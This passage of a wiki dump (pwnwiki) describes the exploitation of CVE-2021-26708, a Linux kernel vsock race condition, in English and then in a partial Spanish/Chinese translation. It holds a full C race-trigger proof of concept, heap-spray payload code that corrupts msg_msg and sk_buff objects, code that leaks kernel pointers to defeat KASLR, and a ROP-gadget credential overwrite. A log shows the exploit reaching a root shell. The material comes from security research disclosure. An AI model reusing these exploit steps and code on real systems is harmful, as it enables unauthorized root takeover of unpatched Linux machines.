               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
But how to use msg_msg to read kernel data? By reading the msgrcv() system call documentation, I found a good solution, using msgrcv() and MSG flags:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
This flag causes the kernel to copy the message data to the user space without deleting it from the message queue. If the kernel has CONFIG_CHECKPOINT_RESTORE=y, then MSG is available and applicable in Fedora Server.

===Steps of arbitrary reading===

Ready to work:
Use sched_getaffinity() and CPU_COUNT() to calculate the number of available CPUs (at least two are required for this vulnerability);
Open /dev/kmsg for analysis;
mmap() configures userfaultfd() in the spray_data memory area as the last part;
Start a separate pthread to handle userfaultfd() events;
Start 127 threads for setxattr()&amp;userfaultfd() heap spray on msg_msg, and hang them on thread_barrier;
Get the kernel address of the original msg_msg:
Conditional competition on virtual sockets;
After the second connect(), wait 35 microseconds in the busy loop;
Call msgsnd() to create a separate message queue; after memory corruption, the msg_msg object is placed in the virtio_vsock_sock position;
Parse the kernel log and save the kernel address of msg_msg from the kernel warning (RCX register);
At the same time, save the kernel address of vsock_sock from the RBX register;
Use the damaged msg_msg to perform arbitrary release of the original msg_msg:
Use 4 bytes of the original msg_msg address as SO_VM_SOCKETS_BUFFER_SIZE to achieve memory corruption;
Conditional competition on virtual sockets;
Call msgsnd() immediately after the second connect(); msg_msg is placed in the position of virtio_vsock_sock to achieve destruction;
The security pointer of the now destroyed msg_msg stores the address of the original msg_msg (from step 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

If the msg_msg.security memory corruption from the setsockopt() thread occurs during the processing of msgsnd(), the SELinux permission check fails;
In this case, msgsnd() returns -1, and the damaged msg_msg is destroyed; releasing msg_msg.security can release the original msg_msg;
Overwrite the original msg_msg with a controllable payload:
After msgsnd() fails, the vulnerability will call pthread_barrier_wait() and call 127 pthreads for heap spraying;
These pthreads execute the payload of setxattr();
The original msg_msg is overwritten by controllable data, and the msg_msg.next pointer stores the address of the vsock_sock object;

[[File:T0140baae964febb059.png | 600px ]]

Read the contents of the vsock_sock kernel object to user space by receiving messages from the message queue storing the overwritten msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

==Find the target of attack==

Here are the points I found:
1. Dedicated block cache, such as PINGv6 and sock_inode_cache have many pointers to objects
2. The struct mem_cgroup *sk_memcg pointer is at offset 664 in vsock_sock.sk. The mem_cgroup structure is allocated in kmalloc-4k block cache.
3. The const struct cred *owner pointer is at offset 840 of vsock_sock.sk, and stores the address of the credential that can be overwritten for permission escalation.
4. The void (*sk_write_space)(struct sock *) function pointer is at offset 688 of vsock_sock.sk and is set to the address of the sock_def_write_space() kernel function. It can be used to calculate the KASLR offset.

Here is how the vulnerability extracts these pointers from memory:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

==Implement Use-after-free on sk_buff==

The network-related buffer in the Linux kernel is represented by struct sk_buff. There are skb_shared_info and destructor_arg in this object, which can be used for control flow hijacking. Network data and skb_shared_info are placed in the same kernel memory block pointed to by sk_buff.head. Therefore, creating a 2800-byte network packet in user space will cause skb_shared_info to be allocated to the kmalloc-4k block cache, as is the mem_cgroup object.

I built the following steps:

1. Use sockets (AF_INET, SOCK_DGRAM, IPPROTO_UDP) to create a client socket and 32 server sockets

2. Prepare a 2800-byte buffer in user space and use 0x42 to memset()

3. Use sendto() to send this buffer from the client socket to each server socket, which is used to create the sk_buff object in kmalloc-4k. Use `sched_setaffinity() on every available CPU

4. Perform arbitrary reading process on vsock_sock

5. Calculate the possible sk_buff kernel address as sk_memcg plus 4096 (the next element of kmalloc-4k)

6. Perform arbitrary reads on this possible sk_buff address

7. If you find 0x42424242424242lu in the location of the network data, find the real sk_buff, and go to step 8. Otherwise, add 4096 to the possible sk_buff address and go to step 6

8. Execute the setxattr()&amp;userfaultfd() heap spray of 32 pthreads on sk_buff and hang them on pthread_barrier

9. Arbitrarily release the sk_buff kernel address

10. Call pthread_barrier_wait(), execute 32 setxattr() to cover the heap spray pthreads of skb_shared_info

11. Use recv() to receive network messages from the server socket.

==Writing freely through skb_shared_info==

The following is a valid payload that overwrites the sk_buff object:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info resides in the injection data, exactly at the offset SKB_SHINFO_OFFSET, which is 3776 bytes. The skb_shared_info.destructor_arg pointer stores the address of struct ubuf_info. Because the kernel address of the attacked sk_buff is known, a fake ubuf_info can be created at MY_UINFO_OFFSET in the network buffer. The following is the layout of a valid payload:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Let's talk about the destructor_arg callback:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Since I couldn't find a gadget that can meet my needs in vmlinuz-5.10.11-200.fc33.x86_64, I researched and constructed it myself.

The callback function pointer stores the address of a ROP gadget, RDI stores the first parameter of the callback function, which is the address of ubuf_info itself, and RDI + 8 points to ubuf_info.desc. gadget moves ubuf_info.desc to RDX. Now RDX contains the effective user ID and group ID address minus one byte. This byte is very important: when the gadget writes message 1 from RSI to the memory pointed to by RDX, the effective uid and gid will be overwritten with zero. Repeat the same process until the privileges are upgraded to root. The output flow of the whole process is as follows:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

==Video==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


==Reference==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>3mahtwt0gpgjtemz0hdqw2jqhfqfrvd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/es</title>
    <ns>0</ns>
    <id>1883</id>
    <revision>
      <id>2304</id>
      <timestamp>2021-05-05T05:44:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Estas vulnerabilidades son causadas por la contención condicional provocada por un falso bloqueo en &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. Estas contenciones de condiciones s..."</comment>
      <origin>2304</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27120" sha1="sxlk6t4fcsr4hafz5xpuh9hwloiri5e" xml:space="preserve">&lt;languages  /&gt;
Vulnerabilidad

Estas vulnerabilidades son causadas por la contención condicional provocada por un falso bloqueo en &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. Estas contenciones de condiciones se introdujeron implícitamente en el commit de noviembre de 2019 que añadió el soporte de multitransferencia VSOCK y se fusionaron en la versión 5.5-rc1 del kernel de Linux.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; y &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; se proporcionan como módulos del núcleo en todas las principales distribuciones de GNU/Linux. Estos módulos vulnerables se cargan automáticamente cuando se crea un socket para el dominio AF_VSOCK.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

La creación de sockets &lt;code&gt;AF_VSOCK&lt;/code&gt; está disponible para los usuarios sin privilegios y no requiere espacio de nombre de usuario.


Corrupción de la memoria

A continuación se detalla la explotación de la CVE-2021-26708, que hace uso de la competencia condicional en &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;, la recuperación requiere dos hilos, el primero de los cuales llama a &lt;code&gt;setsockopt()&lt;/code&gt;.
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



El segundo hilo cambia el transporte del socket virtual cuando &lt;código&gt;vsock_stream_etssockopt()&lt;/código&gt; intenta obtener un bloqueo de socket, lo que se consigue reconectando el socket virtual a.
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Para manejar &lt;code&gt;connect()&lt;/code&gt; para sockets virtuales, el kernel ejecuta &lt;code&gt;vsock_stream_connect()&lt;/code&gt; que llama a &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. Esta función contiene el siguiente código.
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;código&gt;vsock_stream_connect()&lt;/código&gt; contiene el bloqueo del socket, y &lt;código&gt;vsock_stream_setsockopt()&lt;/código&gt; en el hilo paralelo también intenta obtenerlo, constituyendo una competencia condicional. Como resultado, la función &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; es llamada cuando se realiza una segunda &lt;code&gt;connect()&lt;/code&gt; con un &lt;code&gt;svm_cid&lt;/code&gt; diferente. La función ejecuta &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, liberando &lt;code&gt;vsock_sock.trans&lt;/code&gt;, y &lt;code&gt;vsk-&gt;transport&lt;/code&gt; se establece en NULL. cuando &lt;code&gt;vsock_ stream_connect()&lt;/code&gt; libera el bloqueo del socket, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; puede seguir ejecutándose. Llama a &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, seguido de &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Aquí el transporte contiene un valor obsoleto de una variable local que no coincide con &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (la causa se establece en NULL).

El núcleo ejecuta &lt;código&gt;virtio_transport_notify_buffer_size()&lt;/código&gt; con corrupción de memoria.
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Aquí, el vvs es un puntero a la memoria del núcleo, que ha sido liberado en &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. La &lt;code&gt;estructura virtio_vsock_sock&lt;/code&gt; tiene un tamaño de 64 bytes y se encuentra en la caché de bloques kmalloc-64. El tipo de campo buf_alloc es u32, ubicado en el offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE es 0xFFFFFFUL&lt;/code&gt;. El valor de *val es controlado por el atacante, y sus cuatro bytes menos significativos se escriben en la memoria liberada.


Prueba difusa

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/div&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/div&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==四字節的力量==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/div&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內核信息洩露==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
